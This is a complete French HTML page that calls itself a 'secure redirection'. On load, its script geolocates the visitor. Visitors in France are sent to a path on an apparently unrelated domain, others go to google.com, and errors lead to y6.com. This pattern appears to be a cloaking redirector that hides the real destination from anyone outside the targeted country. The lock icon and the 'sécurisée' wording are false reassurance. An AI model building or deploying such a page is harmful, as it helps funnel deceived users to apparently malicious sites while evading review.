<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Redirection en cours…</title>
  <script>
    async function geoRedirect() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        if (data && data.country_code === 'FR') {
          // Si l'utilisateur est en France
          window.location.href = 'https://www.segarasia.com/old/sg/';
        } else {
          // Si l'utilisateur N'EST PAS en France
          window.location.href = 'https://google.com/';
        }

      } catch (e) {
        // En cas d'erreur (ex: API ne répond pas), redirection par défaut
        window.location.href = 'https://y6.com';
      }
    }

    window.onload = geoRedirect;
  </script>
</head>
<body>
  <h1>🔐 Redirection sécurisée</h1>
  <p>Merci de patienter... Vous allez être redirigé(e) automatiquement.</p>
</body>
</html>
